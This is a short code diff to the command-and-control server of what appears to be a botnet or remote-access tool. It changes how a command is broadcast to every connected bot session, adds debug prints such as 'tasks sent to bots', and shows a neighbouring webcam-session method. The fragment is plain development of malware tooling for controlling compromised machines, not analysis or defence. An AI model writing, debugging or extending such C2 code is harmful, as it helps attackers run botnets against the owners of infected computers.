@@ -474,14 +474,20 @@ class C2():
         :param str command:   command to broadcast
 
         """
+        task = {'task':command}
+        print task
         sessions = self.sessions.values()
-        send_tasks = [session.send_task(command) for session in sessions]
+        send_tasks = [session.send_task(task) for session in sessions]
+        print "tasks sent to bots"
+        print "sessions", sessions
         recv_tasks = {session: session.recv_task() for session in sessions}
+        print "tasks received", recv_tasks
         for session, task in recv_tasks.items():
-            if isinstance(task, dict) and task.get('task') == 'prompt' and task.get('result'):
-                session._prompt = task.get('result')
-            elif task.get('result'):
-                self.display(task.get('result'))
+#            if isinstance(task, dict) and task.get('task') == 'prompt' and task.get('result'):
+#                session._prompt = task.get('result')
+#            elif task.get('result'):
+            print task.get('result')
+            self.display(task.get('result'))
         self._return()
 
     def session_webcam(self, args=''):
